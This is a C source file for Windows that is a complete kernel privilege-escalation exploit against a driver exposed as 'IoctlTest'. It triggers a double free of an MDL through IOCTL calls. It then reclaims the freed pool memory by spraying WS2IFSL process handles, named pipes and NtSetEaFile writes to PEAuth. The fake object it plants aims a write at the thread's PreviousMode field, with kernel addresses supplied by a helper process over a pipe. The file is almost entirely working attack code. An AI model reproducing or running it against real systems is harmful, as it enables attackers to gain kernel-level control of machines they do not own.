﻿#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment (lib, "ntdll")

#define DEVICE L"\\\\.\\IoctlTest"
#define IOCTL_ALLOCATE32 0x9C402400
#define IOCTL_RELEASE32  0x9C402408
#define IOCTL_ALLOCATE64 0x9C402404
#define IOCTL_RELEASE64  0x9C40240C


#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

// utils
void HexDump(void* mem, unsigned int len) {
	unsigned int i, j;

	for (i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {
		/* print offset */
		if (i % HEXDUMP_COLS == 0) {
			printf("0x%06x: ", i);
		}

		/* print hex data */
		if (i < len) {
			printf("%02x ", 0xFF & ((char*)mem)[i]);
		}
		else /* end of block, just aligning for ASCII dump */ {
			printf("   ");
		}

		/* print ASCII dump */
		if (i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {
			for (j = i - (HEXDUMP_COLS - 1); j <= i; j++) {
				if (j >= len) /* end of block, not really printing */ {
					putchar(' ');
				}
				else if (isprint(((char*)mem)[j])) /* printable char */ {
					putchar(0xFF & ((char*)mem)[j]);
				}
				else /* other char */ {
					putchar('.');
				}
			}
			putchar('\n');
		}
	}
}
// utils

// exploit
HANDLE ghDev;

void AllocateMdl(int size) {
	UCHAR InBuf[0x04];
	UCHAR OutBuf[0x0C];
	RtlFillMemory(InBuf, sizeof(InBuf), 0x0);
	RtlFillMemory(OutBuf, sizeof(OutBuf), 0x0);
	*(PDWORD32)&InBuf[0x0] = size;

	BOOL ret = FALSE;
	DWORD dwOutput = 0;
	if (ret = DeviceIoControl(
		ghDev,
		IOCTL_ALLOCATE64,
		InBuf,
		sizeof(InBuf),
		OutBuf,
		sizeof(OutBuf),
		&dwOutput,
		0
	), ret == FALSE) {
		wprintf(L"DeviceIoControl(IOCTL_ALLOCATE64) failed, err: %d\n", GetLastError());
		exit(-1);
	};

	// wprintf(L"Allocate succeeded, dwOutput = %d\n", dwOutput);
}

void AllocateContiguousMemory(int size) {
	UCHAR InBuf[0x04];
	UCHAR OutBuf[0x08];
	RtlFillMemory(InBuf, sizeof(InBuf), 0x0);
	RtlFillMemory(OutBuf, sizeof(OutBuf), 0x0);
	*(PDWORD32)&InBuf[0x0] = size;

	BOOL ret = FALSE;
	DWORD dwOutput = 0;
	if (ret = DeviceIoControl(
		ghDev,
		IOCTL_ALLOCATE32,
		InBuf,
		sizeof(InBuf),
		OutBuf,
		sizeof(OutBuf),
		&dwOutput,
		0
	), ret == FALSE) {
		wprintf(L"DeviceIoControl(IOCTL_ALLOCATE32) failed, err: %d\n", GetLastError());
		exit(-1);
	};

	// wprintf(L"Allocate succeeded, dwOutput = %d\n", dwOutput);
}


void FreeMdl() {

	UCHAR Buf[1] = { 'x' };
	BOOL ret = FALSE;
	DWORD dwOutput = 0;
	if (ret = DeviceIoControl(
		ghDev,
		IOCTL_RELEASE64,
		Buf,
		sizeof(Buf),
		Buf,
		sizeof(Buf),
		&dwOutput,
		0
	), ret == FALSE) {
		wprintf(L"DeviceIoControl(IOCTL_RELEASE64) failed, err: %d\n", GetLastError());
		exit(-1);
	};

	// wprintf(L"first free succeeded, dwOutput = %d\n", dwOutput);
}

void Clean() {
	CloseHandle(ghDev);
	// free(helper);
}

// exploit

// ws2ifsl
// wdm.h
typedef struct _FILE_FULL_EA_INFORMATION {
	ULONG NextEntryOffset;
	UCHAR Flags;
	UCHAR EaNameLength;
	USHORT EaValueLength;
	CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;

typedef struct _PROC_DATA {
	HANDLE apcthread;		// 0x00
	void* RequestQueueRoutine;		// 0x04
	void* CancelQueueRoutine;		// 0x08
	void* ApcContext;		// 0x0C
	void* unknown3;		// 0x10
}PROC_DATA, * PPROC_DATA;

HANDLE ghThreadApc;

HANDLE CreateProcessHandle(HANDLE hThreadApc) {
	UNICODE_STRING deviceName;
	RtlInitUnicodeString(&deviceName, (PWSTR)L"\\Device\\WS2IFSL\\NifsPvd");

	OBJECT_ATTRIBUTES object;
	InitializeObjectAttributes(&object, &deviceName, 0, NULL, NULL);

	FILE_FULL_EA_INFORMATION* eaBuffer = (FILE_FULL_EA_INFORMATION*)malloc(sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA));

	if (eaBuffer == NULL) {
		wprintf(L"malloc failed, err: %d\n", GetLastError());
		exit(-1);
	}

	eaBuffer->NextEntryOffset = 0;
	eaBuffer->Flags = 0;
	eaBuffer->EaNameLength = sizeof("NifsPvd") - 1;
	eaBuffer->EaValueLength = sizeof(PROC_DATA);
	memcpy(eaBuffer->EaName, "NifsPvd", eaBuffer->EaNameLength + 1);

	PROC_DATA* eaData = (PROC_DATA*)((char*)eaBuffer + sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") - 4);
	eaData->apcthread = hThreadApc;
	eaData->RequestQueueRoutine = (void*)0xaaaaaaaa;
	eaData->CancelQueueRoutine = (void*)0xbbbbbbbb;
	eaData->ApcContext = (void*)0xcccccccc;
	eaData->unknown3 = (void*)0xdddddddd;

	HANDLE handle = INVALID_HANDLE_VALUE;
	IO_STATUS_BLOCK IoStatusBlock;
	NTSTATUS status = NtCreateFile(
		&handle,
		MAXIMUM_ALLOWED,
		&object,
		&IoStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN_IF,
		0,
		eaBuffer,
		sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA)
	);
	// wprintf(L"hProcess = %p\n", handle);
	// getchar();
	if (NT_ERROR(status)) {
		wprintf(L"(Process)NtCreateFile failed, err: %d\n", GetLastError());
		free(eaBuffer);
		exit(-1);
	}

	free(eaBuffer);
	return handle;
}

// ws2ifsl


// exploit
const ULONG64 CountSprayWs2P = 0x100;
const ULONG64 CountSprayPipe = 0x100;
const ULONG64 CountSprayEaFile = 0x1000;
DWORD CountConcurrentSprayEaFile = 0x0; // set to cpu number later
const ULONG64 CountSprayMm = 0x1000;
HANDLE* hProcessList;

#pragma pack(1)
typedef struct {
	ULONG64 hHelper; // HANDLE of Process Helper

	ULONG64 hThread; // HANDLE of Thread
	ULONG64 kEThread; // address of _ETHREAD of hThread

	ULONG64 kSystemEProcess; // address of _EPROCESS of system process
	ULONG64 kSelfEProcess; // address of _EPROCESS of hHelper
} HelperStruct;
#pragma pack()

HelperStruct* helper;

typedef NTSTATUS(WINAPI* NtSetEaFile_t)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG);
NtSetEaFile_t NtSetEaFile = 0;

typedef struct {
	HANDLE hPEAuth;
	UCHAR* payload;
	ULONG PayloadSize;
} ParamSprayEaFile;;


DWORD WINAPI APCThread(LPVOID lparam) {
	while (1) {
		Sleep(0x100);
	}
}

HANDLE CallHelper() {
	// wprintf(L"sizeof(HelperStruct) == 0x%lx\n", sizeof(HelperStruct));
	helper = (HelperStruct*)malloc(sizeof(HelperStruct));
	if (helper == NULL) {
		wprintf(L"malloc failed, err: %d\n", GetLastError());
		exit(-1);
	}
	memset(helper, 0, sizeof(HelperStruct));


	HANDLE hPipe = CreateFile(L"\\\\.\\pipe\\pipe_helper", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hPipe == INVALID_HANDLE_VALUE) {
		wprintf(L"CreateFile(pipe_helper) failed, err: %d\n", GetLastError());
		exit(-1);
	}

	DWORD BytesRead;
	if (!ReadFile(hPipe, helper, sizeof(HelperStruct), &BytesRead, 0)) {
		wprintf(L"ReadFile failed, err: %d\n", GetLastError());
		exit(-1);
	}

	wprintf(L"process = %lld, handle = %llx, ThreadObject = 0x%llx\n", helper->hHelper, helper->hThread, helper->kEThread);

	// CloseHandle(hPipe);
	return hPipe;
}

void NotifyHelper(HANDLE hPipe) {
	UCHAR x = 'X';
	DWORD BytesWritten;
	if (!WriteFile(hPipe, &x, sizeof(x), &BytesWritten, 0)) {
		wprintf(L"WriteFile(hPipe) failed, err: %d\n", GetLastError());
		exit(-1);
	}
	Sleep(3000);
	CloseHandle(hPipe);
}


HANDLE Setup() {
	ghDev = CreateFile(
		DEVICE,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (ghDev == INVALID_HANDLE_VALUE) {
		wprintf(L"CreateFile(DEVICE) failed, err %d\n", GetLastError());
		exit(-1);
	}
	// wprintf(L"Open device %s succeeded, handle: %p\n", DEVICE, ghDev);

	ghThreadApc = CreateThread(0, 0, APCThread, 0, 0, 0);
	if (ghThreadApc == INVALID_HANDLE_VALUE) {
		wprintf(L"CreateThread failed, err: %d\n", GetLastError());
		exit(-1);
	}

	hProcessList = (HANDLE*)malloc(sizeof(HANDLE) * CountSprayWs2P);
	if (hProcessList == NULL) {
		wprintf(L"malloc failed, err: %d\n", GetLastError());
		exit(-1);
	}
	memset(hProcessList, -1, sizeof(HANDLE) * CountSprayWs2P);

	HMODULE hntdll = LoadLibrary(L"ntdll.dll");
	if (hntdll == NULL) {
		wprintf(L"LoadLibrary(ntdll) failed, err: %d\n", GetLastError());
		exit(-1);
	}
	NtSetEaFile = (NtSetEaFile_t)GetProcAddress(hntdll, "NtSetEaFile");
	if (NtSetEaFile == NULL) {
		wprintf(L"GetProcAddress(NtSetEaFile) failed, err: %d\n", GetLastError());
		exit(-1);
	}

	HANDLE hPipe = CallHelper();
	return hPipe;
}

void SprayPipe(ULONG32 size) {
	wprintf(L"spray NpFr begin...\n");
	ULONG32 payloadSize = size - 0x40;
	for (int i = 0; i < CountSprayPipe; i++) {
		HANDLE readPipe, writePipe;
		UCHAR* payload = (UCHAR*)malloc(payloadSize);
		if (payload == NULL) {
			wprintf(L"malloc failed, err: %d\n", GetLastError());
			exit(-1);
		}
		memset(payload, 'p', payloadSize);
		BOOL res = CreatePipe(&readPipe, &writePipe, NULL, payloadSize);
		if (res == FALSE) {
			wprintf(L"CreatePipe failed, err: %d\n", GetLastError());
			Clean();
			exit(-1);
		}

		DWORD resultLength;
		// res = WriteFile(writePipe, payload, sizeof(payload), &resultLength, NULL);
		res = WriteFile(writePipe, payload, payloadSize, &resultLength, NULL);
		if (res == FALSE) {
			wprintf(L"WriteFile failed, err: %d\n", GetLastError());
			Clean();
			exit(-1);
		}
	}
	wprintf(L"spray NpFr done!\n");
}


DWORD WINAPI ThreadSprayEaFile(LPVOID param) {
	ParamSprayEaFile* _param = (ParamSprayEaFile*)param;
	// wprintf(L"In ThreadSprayEaFile\n");
	// HexDump(_param->payload, _param->PayloadSize);

	IO_STATUS_BLOCK iostatus;
	for (int i = 0; i < CountSprayEaFile; i++) {
		// HexDump(_param->payload, _param->PayloadSize);
		NtSetEaFile(_param->hPEAuth, &iostatus, _param->payload, _param->PayloadSize);
	}
	// wprintf(L"ThreadSprayEaFile done\n");

	return 0;
}
void SprayEaFile(ULONG size) {
	// SYSTEM_INFO SystemInfo;
	// GetSystemInfo(&SystemInfo);
	// GetNativeSystemInfo(&SystemInfo);
	// CountConcurrentSprayEaFile = SystemInfo.dwNumberOfProcessors;
	CountConcurrentSprayEaFile = 2;
	// wprintf(L"number of processors = %d\n", CountConcurrentSprayEaFile);

	wprintf(L"spray IoSb begin\n");
	ParamSprayEaFile* param = (ParamSprayEaFile*)malloc(sizeof(ParamSprayEaFile));
	if (param == NULL) {
		wprintf(L"malloc failed, err: %d\n", GetLastError());
		exit(-1);
	}

	param->PayloadSize = size - 0x10;
	param->hPEAuth = CreateFile(
		L"\\\\.\\PEAuth",
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	if (param->hPEAuth == INVALID_HANDLE_VALUE) {
		wprintf(L"CreateFile(PEAuth) failed, err: %d\n", GetLastError());
		exit(-1);
	}

	param->payload = (UCHAR*)malloc(param->PayloadSize);
	if (param->payload == NULL) {
		wprintf(L"malloc failed, err: %d\n", GetLastError());
		exit(-1);
	}
	memset(param->payload, 'x', param->PayloadSize);
	// fake ProcessContext
	*(ULONG32*)(&param->payload[0x0]) = 0x636F7250; // Proc
	// *(ULONG64*)(&param->payload[0x38]) = 0x6161616161616161; // FsContext->RequestAPC.Thread
	// *(ULONG64*)(&param->payload[0x38]) = helper->kProcessToken + 0x40 + 0x30; // FsContext->RequestAPC.Thread ; _TOKEN->Privileges.Present
	*(ULONG64*)(&param->payload[0x38]) = helper->kEThread + 0x232 + 0x30; // FsContext->RequestAPC.Thread ; _ETHREAD._KTHREAD.PreviousMode
	// fake ProcessContext

	HANDLE* hThreadList = (HANDLE*)malloc(sizeof(HANDLE) * CountConcurrentSprayEaFile);
	if (hThreadList == NULL) {
		wprintf(L"malloc failed, err: %d\n", GetLastError());
		exit(-1);
	}
	for (unsigned int i = 0; i < CountConcurrentSprayEaFile; i++) {
		hThreadList[i] = CreateThread(0, 0, ThreadSprayEaFile, param, CREATE_SUSPENDED, 0);
		if (hThreadList[i] == NULL) {
			wprintf(L"CreateThread failed, err: %d\n", GetLastError());
			exit(-1);
		}

		if (SetThreadAffinityMask(hThreadList[i], 1 << i) == 0) {
			wprintf(L"SetThreadAffinityMask failed, err: %d\n", GetLastError());
			exit(-1);
		}
	}

	for (unsigned int i = 0; i < CountConcurrentSprayEaFile; i++) {
		ResumeThread(hThreadList[i]);
	}

	WaitForMultipleObjects(CountConcurrentSprayEaFile, hThreadList, TRUE, INFINITE);

	for (unsigned int i = 0; i < CountConcurrentSprayEaFile; i++) {
		CloseHandle(hThreadList[i]);
	}
	CloseHandle(param->hPEAuth);
	free(param->payload);
	free(param);

	wprintf(L"spray IoSb done\n");
}
// exploit


int wmain() {
	HANDLE hPipe = Setup();
	// (void)getchar();

	// de-fragment
	for (int i = 0; i < 100; i++) {
		AllocateMdl(0x1b000);
	}
	SprayPipe(0x120);
	// de-fragment

	AllocateMdl(0x1b000);

	FreeMdl(); // first free

	// reclaim Mdl with Ws2P
	for (int i = 0; i < CountSprayWs2P; i++) {
		hProcessList[i] = CreateProcessHandle(ghThreadApc);
	}
	// reclaim Mm with Mm
	for (int i = 0; i < CountSprayMm; i++) {
		AllocateContiguousMemory(0x1b000);
	}

	FreeMdl(); // double free
	// SprayPipe(0x120); // reclaim Ws2P with NpFr
	SprayEaFile(0x120); // reclaim Ws2P with IoSB

	for (int i = 0; i < CountSprayWs2P; i++) {
		CloseHandle(hProcessList[i]);
	}
	// wprintf(L"Close done!\n");

	wprintf(L"Hope we lucky!\n");
	NotifyHelper(hPipe);
	// (void )getchar();
	// Clean();

	return 0;
}